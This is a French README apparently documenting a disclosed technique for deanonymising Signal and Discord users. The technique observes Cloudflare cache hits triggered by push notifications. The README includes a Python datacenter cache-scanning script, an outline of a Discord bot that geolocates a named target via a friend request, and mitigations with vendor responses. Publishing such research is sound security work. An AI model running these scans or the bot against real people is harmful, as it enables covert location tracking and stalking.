# Projet de Désanonymisation par Exploitation du Caching Cloudflare

Ce dépôt documente une méthode avancée de désanonymisation dite « 0-clic » exploitant des vulnérabilités liées au système de caching des Content Delivery Networks (CDN), en particulier Cloudflare, et l’utilisation des notifications push dans des applications populaires telles que Signal et Discord.

Le présent rapport offre une vue d’ensemble du mécanisme technique, des méthodes d’attaque, des exemples de code et des mesures de protection pour atténuer le risque d’exploitation.

---

## Table des Matières

- [Contexte et Motivation](#contexte-et-motivation)
- [Architecture Technique et Mécanismes de Caching](#architecture-technique-et-mécanismes-de-caching)
- [Exploitation du Caching pour la Désanonymisation](#exploitation-du-caching-pour-la-désanonymisation)
  - [Analyse du Cache Cloudflare](#analyse-du-cache-cloudflare)
  - [Utilisation de Cloudflare Teleport](#utilisation-de-cloudflare-teleport)
- [Cas d’Utilisation et Scénarios d’Attaque](#cas-dutilisation-et-scénarios-dattaque)
  - [Attaque sur Signal](#attaque-sur-signal)
  - [Attaque sur Discord](#attaque-sur-discord)
- [Exemples de Code et Automatisation](#exemples-de-code-et-automatisation)
  - [Exemple en Python – Analyse d’en-têtes HTTP](#exemple-en-python---analyse-den-tetes-http)
  - [Exemple de Script pour Scanner des Datacenters](#exemple-de-script-pour-scanner-des-datacenters)
  - [Automatisation d’attaque via Bot Discord « GeoGuesser »](#automatisation-dattaque-via-bot-discord-geoguesser)
- [Mesures de Protection et Recommandations](#mesures-de-protection-et-recommandations)
- [Bug Bounty et Réponses des Parties Impactées](#bug-bounty-et-réponses-des-parties-impactées)
- [Conclusion](#conclusion)
- [Licence](#licence)

---

## Contexte et Motivation

La méthode décrite dans ce projet exploite le fait que les CDN comme Cloudflare stockent des copies de ressources en cache dans des datacenters proches de l’utilisateur final afin d’améliorer les performances. En observant les en-têtes HTTP spécifiques (ex. `cf-cache-status` et `cf-ray`), il est possible d’estimer la localisation géographique de l’utilisateur avec une précision surprenante. Cette approche est particulièrement dangereuse lorsqu’elle est appliquée aux notifications push des applications sensibles (Signal, Discord) qui téléchargent automatiquement des images lors de la réception d’un message ou d’une demande d’amitié.

---

## Architecture Technique et Mécanismes de Caching

### Principe du Caching dans Cloudflare

- **Caching localisé :**  
  Cloudflare stocke des copies de contenus (images, vidéos, pages web) dans des datacenters répartis dans le monde entier. La proximité du datacenter améliore la latence et la performance.

- **En-têtes HTTP informatifs :**  
  Lorsqu’une requête est traitée, Cloudflare renvoie des en-têtes comme `cf-cache-status` (indiquant si la ressource a été servie depuis le cache) et `cf-ray` (indiquant le datacenter ayant servi la requête).

- **Système Anycast :**  
  L’architecture anycast fait que toutes les requêtes sont dirigées vers le datacenter le plus proche de l’utilisateur. Cette caractéristique, bien qu’avantageuse pour la performance, peut être détournée pour obtenir des informations géographiques.

### Cloudflare Teleport et la Traversée des Datacenters

- **Objectif de Cloudflare Teleport :**  
  Cet outil, basé sur Cloudflare Workers, permettait d’envoyer des requêtes HTTP à des datacenters spécifiques en utilisant des plages d’IP internes (initialement celles de Cloudflare WARP).

- **Méthodologie :**  
  En modifiant l’origine de la requête, il était possible de contourner l’orientation par défaut anycast et de forcer l’utilisation d’un datacenter précis. Même après la correction de cette faille par Cloudflare, l’utilisation de VPN offre une alternative pour atteindre plusieurs datacenters.

---

## Exploitation du Caching pour la Désanonymisation

### Analyse du Cache Cloudflare

En forçant le chargement d’une ressource sur un site supporté par Cloudflare, il est possible de déterminer :

- **Si la ressource est mise en cache (`HIT` ou `MISS`).**
- **Quel datacenter a servi la ressource (via l’en-tête `cf-ray`).**

Cette technique permet de déduire l’emplacement approximatif de l’utilisateur, en identifiant le datacenter le plus proche.

### Utilisation de Cloudflare Teleport

Cloudflare Teleport redirige les requêtes HTTP vers un datacenter choisi grâce à une URL paramétrée.  
Exemple d’URL :  
```
https://cfteleport.xyz/?proxy=https://cloudflare.com/cdn-cgi/trace&colo=SEA
```
Cette requête force la réponse à être traitée par le datacenter de Seattle (SEA), permettant ainsi d’observer la mise en cache d’une ressource et de récolter les informations associées.

---

## Cas d’Utilisation et Scénarios d’Attaque

### Attaque sur Signal

**Principe :**  
Signal utilise deux CDN pour servir des contenus :  
- `cdn.signal.org` pour les avatars.  
- `cdn2.signal.org` pour les pièces jointes.

**Scénario d’attaque 1-clic :**  
1. Envoyer une pièce jointe (ex. une image 1x1) dans une conversation.  
2. Lors de l’ouverture de la conversation, la pièce jointe est téléchargée et mise en cache par le datacenter local.  
3. Scanner les en-têtes HTTP pour déduire l’emplacement de la cible.

**Scénario d’attaque 0-clic via Notifications Push :**  
Les notifications push de Signal téléchargent automatiquement l’image de la pièce jointe, même si l’application n’est pas ouverte. Ainsi, la mise en cache s’effectue sans aucune interaction de l’utilisateur.

### Attaque sur Discord

**Principe :**  
Discord met en cache les images, notamment les avatars personnalisés, qui sont chargés via Cloudflare.

**Scénario d’attaque 1-clic :**  
1. Modifier l’avatar d’un compte pour générer une URL non encore utilisée.  
2. Envoyer une demande d’amitié ou déclencher une notification qui charge l’avatar sur le téléphone de la cible.  
3. Scanner la mise en cache pour identifier le datacenter.

**Automatisation avec « GeoGuesser » :**  
Un bot Discord automatisé, appelé GeoGuesser, effectue les étapes suivantes :  
- Change l’avatar utilisateur pour en générer un nouveau hash.  
- Envoie une demande d’amitié déclenchant la notification push.  
- Utilise un script de scan (via Cloudflare Teleport ou VPN) pour identifier les datacenters ayant mis en cache l’avatar.  
- Calcule la position probable de la cible en estimant le point médian entre les datacenters.

---

## Exemples de Code et Automatisation

### Exemple en Python – Analyse d’en-têtes HTTP

Cet exemple en Python montre comment envoyer une requête vers une URL et extraire les en-têtes `cf-ray` et `cf-cache-status` :

```python
import requests

def obtenir_infos_cache(url):
    try:
        response = requests.get(url)
        # Extraction des en-têtes pertinents
        cf_ray = response.headers.get('cf-ray', 'Inconnu')
        cache_status = response.headers.get('cf-cache-status', 'Inconnu')
        return cf_ray, cache_status
    except Exception as e:
        print(f"Erreur lors de la requête : {e}")
        return None, None

if __name__ == '__main__':
    url = "https://www.namecheap.com/favicon.ico"
    cf_ray, cache_status = obtenir_infos_cache(url)
    print(f"cf-ray : {cf_ray}")
    print(f"cf-cache-status : {cache_status}")
```

### Exemple de Script pour Scanner des Datacenters

Ce script parcourt une liste de codes de datacenters et vérifie la présence du cache pour une ressource donnée :

```python
import requests

datacenters = ["SEA", "IAD", "EWR", "LAX", "CDG"]  # Exemples de codes de datacenters

def scanner_cache(url, colo):
    proxy_url = f"https://cfteleport.xyz/?proxy={url}&colo={colo}"
    try:
        response = requests.get(proxy_url, timeout=5)
        cf_cache = response.headers.get('cf-cache-status', 'Inconnu')
        return cf_cache
    except Exception as e:
        return f"Erreur : {e}"

if __name__ == '__main__':
    url = "https://www.namecheap.com/favicon.ico"
    for colo in datacenters:
        statut = scanner_cache(url, colo)
        print(f"Datacenter {colo} - cf-cache-status : {statut}")
```

### Automatisation d’Attaque via Bot Discord « GeoGuesser »

Le bot Discord « GeoGuesser » combine plusieurs actions pour automatiser l’attaque. Voici une illustration conceptuelle du processus en pseudo-code :

```python
import discord
import random
import requests

# Configuration et initialisation du bot
client = discord.Client()

@client.event
async def on_ready():
    print("Bot GeoGuesser actif.")

@client.event
async def on_message(message):
    if message.content.startswith("!geoguesser"):
        # Extraire le nom d'utilisateur cible depuis la commande
        target_username = message.content.split()[1]
        
        # Étape 1 : Modifier l'avatar du bot avec une image aléatoire
        new_avatar = obtenir_image_aleatoire()  # Fonction à définir pour générer une image
        await client.user.edit(avatar=new_avatar)
        
        # Étape 2 : Envoyer une demande d'amitié à la cible (API Discord à utiliser)
        envoyer_demande_amitie(target_username)
        
        # Étape 3 : Attendre quelques secondes pour que la notification push soit déclenchée
        await asyncio.sleep(10)
        
        # Étape 4 : Scanner l'URL de l'avatar via différents datacenters
        avatar_url = f"https://cdn.discordapp.com/avatars/{target_username}/avatarhash"
        resultats = {}
        for colo in ["SEA", "IAD", "EWR"]:
            resultats[colo] = scanner_cache(avatar_url, colo)
        
        # Étape 5 : Calculer le point médian et envoyer le résultat sur Discord
        localisation = calculer_localisation(resultats)
        await message.channel.send(f"Localisation estimée : {localisation}")

client.run("VOTRE_TOKEN_DISCORD")
```

> **Note :** Les fonctions `obtenir_image_aleatoire()`, `envoyer_demande_amitie()`, `scanner_cache()` et `calculer_localisation()` doivent être définies selon les spécificités de l’API utilisée et les besoins du projet.

---

## Mesures de Protection et Recommandations

Pour limiter l’impact de cette vulnérabilité, il est recommandé de :

- **Désactiver le caching sur les ressources sensibles :**  
  Configurer les règles de cache pour empêcher le stockage de données sensibles dans des datacenters accessibles publiquement.

- **Utiliser des réseaux de confidentialité renforcés :**  
  Privilégier l’utilisation de VPN ou de réseaux tels que Tor pour réduire l’exposition lors de la transmission des données.

- **Restreindre les notifications push :**  
  Modifier les paramètres de notifications pour limiter les informations envoyées automatiquement (par exemple, ne pas inclure d’images directement dans les notifications).

- **Revoir l’architecture CDN :**  
  Adapter la configuration du CDN pour s’assurer que la géolocalisation par cache ne permette pas d’inférer la localisation de l’utilisateur final.

---

## Bug Bounty et Réponses des Parties Impactées

- **Signal :**  
  La vulnérabilité a été signalée, mais Signal a décliné toute responsabilité, arguant que la protection de l’identité relevait de l’utilisateur, ce qui est en contradiction avec leur position en tant que plateforme axée sur la confidentialité.

- **Discord :**  
  Initialement, la sécurité de Discord s’était engagée à examiner le problème avant de renvoyer la responsabilité à Cloudflare.

- **Cloudflare :**  
  La faille a été patchée après une communication via leur programme HackerOne, bien que la correction n’élimine pas entièrement le risque d’exploitation par d’autres moyens (notamment via des VPN).

---

## Conclusion

Ce projet démontre que les mécanismes de caching des CDN, combinés aux fonctionnalités de notifications push, peuvent introduire des vulnérabilités permettant la désanonymisation d’utilisateurs. L’approche décrite, même si elle a été corrigée en partie par les mises à jour de Cloudflare, reste représentative des défis posés par l’interconnexion des infrastructures numériques modernes.

L’adoption de mesures de protection et la sensibilisation aux risques liés au caching anycast sont essentielles pour limiter l’exploitation de ces vulnérabilités, en particulier pour les utilisateurs occupant des rôles sensibles dans la société.

---

## Licence

Ce projet est mis à disposition sous la [Licence MIT](LICENSE).
